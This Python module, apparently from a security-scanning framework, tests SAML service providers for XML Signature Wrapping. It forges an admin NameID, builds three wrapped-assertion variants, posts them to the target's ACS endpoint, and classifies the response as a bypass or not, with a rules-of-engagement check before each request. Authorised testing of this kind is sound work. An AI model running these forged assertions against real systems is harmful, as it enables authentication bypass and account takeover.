from __future__ import annotations

import base64
import json
import re
from urllib.parse import unquote

from ..config import load_engine
from ..contract import Capability, ScanResult
from ..roe_guard import ROEGuard, ROEViolation
from .. import http as _http


CAPABILITY = Capability(
    name="saml_xsw",
    description="SAML XML Signature Wrapping (3 structural variants).",
    category="auth",
    cost="medium",
    destructive=False,
    idempotent=False,
)

ASSERTION_RE = re.compile(
    r"<([a-zA-Z][\w\-]*):Assertion\b[^>]*>.*?</\1:Assertion>",
    re.DOTALL,
)

NAMEID_RE = re.compile(
    r"<([a-zA-Z][\w\-]*):NameID\b([^>]*)>([^<]*)</\1:NameID>",
    re.DOTALL,
)

SUCCESS_PATHS = ("/dashboard", "/home", "/app", "/account", "/profile",
                  "/welcome", "/portal", "/user")
FAILURE_PATHS = ("/login", "/signin", "/sign-in", "/error", "/sso",
                  "/saml", "/auth/fail", "/unauthorized")


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _roe_block(guard, url, method="POST"):
    if guard is None:
        try:
            guard = ROEGuard(engine_cfg=load_engine())
        except Exception as e:
            return f"ROE guard unavailable (fail-closed): {e}"
    try:
        guard.check_url(url, method)
        return None
    except ROEViolation as e:
        return str(e)


def _decode(b64):
    s = (b64 or "").strip().replace("\n", "").replace("\r", "").replace(" ", "+")
    s = unquote(s)
    if not s:
        return None
    try:
        return base64.b64decode(s)
    except Exception:
        return None


def _encode(raw):
    if isinstance(raw, str):
        raw = raw.encode("utf-8")
    return base64.b64encode(raw).decode("ascii")


def _find_assertion(xml):
    m = ASSERTION_RE.search(xml)
    if not m:
        return None
    return {"match": m, "start": m.start(), "end": m.end(), "text": m.group(0)}


def _forge_nameid(assertion_xml, new_id):
    def _replace(m):
        return f"<{m.group(1)}:NameID{m.group(2)}>{new_id}</{m.group(1)}:NameID>"
    return NAMEID_RE.sub(_replace, assertion_xml, count=1)


def _variant_before(xml, assertion):
    forged = _forge_nameid(assertion["text"], "admin@xsw.local")
    return xml[:assertion["start"]] + forged + xml[assertion["start"]:]


def _variant_after(xml, assertion):
    forged = _forge_nameid(assertion["text"], "admin@xsw.local")
    return xml[:assertion["end"]] + forged + xml[assertion["end"]:]


def _variant_wrapped(xml, assertion):
    forged = _forge_nameid(assertion["text"], "admin@xsw.local")
    wrapped = (
        '<saml:Extensions xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
        + assertion["text"]
        + '</saml:Extensions>'
    )
    return xml[:assertion["start"]] + forged + wrapped + xml[assertion["end"]:]


VARIANTS = [
    ("evil_before_signed", _variant_before),
    ("evil_after_signed", _variant_after),
    ("evil_signed_wrapped", _variant_wrapped),
]


def _post_to_acs(acs_url, saml_response_b64, timeout, verify, roe_guard):
    viol = _roe_block(roe_guard, acs_url, "POST")
    if viol:
        return {"blocked": True, "error": f"ROE_BLOCK: {viol}"}
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            r = c.post(
                acs_url,
                data={"SAMLResponse": saml_response_b64, "RelayState": ""},
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
        headers = {k.lower(): v for k, v in r.headers.items()}
        return {"status": r.status_code, "headers": headers,
                "body": (r.text or "")[:4000]}
    except Exception as e:
        return {"status": None, "error": f"{type(e).__name__}: {e}"}


def _classify(resp):
    if not resp or resp.get("status") is None:
        return "UNKNOWN", "no response"
    status = resp["status"]
    headers = resp.get("headers") or {}
    loc = (headers.get("location") or "").lower()
    set_cookie = [k for k in headers if k == "set-cookie"]
    if status in (301, 302, 303, 307, 308):
        if any(p in loc for p in FAILURE_PATHS):
            return "PASS", f"rejected (redirect to {loc[:80]})"
        if any(p in loc for p in SUCCESS_PATHS):
            return "VULNERABLE", f"accepted (redirect to {loc[:80]})"
        return "UNKNOWN", f"ambiguous redirect to {loc[:80]}"
    if status == 200 and set_cookie:
        return "VULNERABLE", "accepted (200 + Set-Cookie)"
    if status in (401, 403):
        return "PASS", f"rejected (HTTP {status})"
    if status == 200:
        return "UNKNOWN", "200 without Set-Cookie"
    return "UNKNOWN", f"HTTP {status}"


def scan(acs_url, saml_response_b64, roe_guard=None, timeout=15,
         new_name_id="admin@xsw.local"):
    verify = _verify_tls()
    decoded = _decode(saml_response_b64)
    if not decoded:
        return ScanResult(
            capability="saml_xsw", target=acs_url,
            verdict="UNKNOWN",
            reason="SAMLResponse could not be base64-decoded",
        )
    try:
        xml = decoded.decode("utf-8", "replace")
    except Exception:
        return ScanResult(
            capability="saml_xsw", target=acs_url,
            verdict="UNKNOWN", reason="decoded SAMLResponse is not text",
        )
    assertion = _find_assertion(xml)
    if not assertion:
        return ScanResult(
            capability="saml_xsw", target=acs_url,
            verdict="UNKNOWN",
            reason="no <Assertion> block found in SAMLResponse",
        )

    results = {}
    for name, mutator in VARIANTS:
        try:
            mutated = mutator(xml, assertion)
        except Exception as e:
            results[name] = {"verdict": "UNKNOWN",
                             "reason": f"variant build failed: {type(e).__name__}: {e}"}
            continue
        encoded = _encode(mutated)
        resp = _post_to_acs(acs_url, encoded, timeout, verify, roe_guard)
        if resp.get("blocked"):
            return ScanResult(
                capability="saml_xsw", target=acs_url,
                verdict="UNKNOWN", reason=resp["error"],
            )
        verdict, reason = _classify(resp)
        results[name] = {"verdict": verdict, "reason": reason,
                         "status": resp.get("status")}
        if verdict == "VULNERABLE":
            return ScanResult(
                capability="saml_xsw", target=acs_url,
                verdict="VULNERABLE", severity="critical",
                reason=f"SAML XSW bypass via {name}: {reason}",
                evidence={"variant": name, "results": results,
                          "forged_name_id": new_name_id},
            )

    rank = {"VULNERABLE": 3, "SUSPICIOUS": 2, "PASS": 1, "UNKNOWN": 0}
    overall = "PASS"
    for r in results.values():
        if rank.get(r.get("verdict"), 0) > rank.get(overall, 0):
            overall = r.get("verdict")
    return ScanResult(
        capability="saml_xsw", target=acs_url,
        verdict=overall, severity="low" if overall == "PASS" else "medium",
        reason=f"{len(results)} variant(s) tested, no bypass",
        evidence={"results": results},
    )
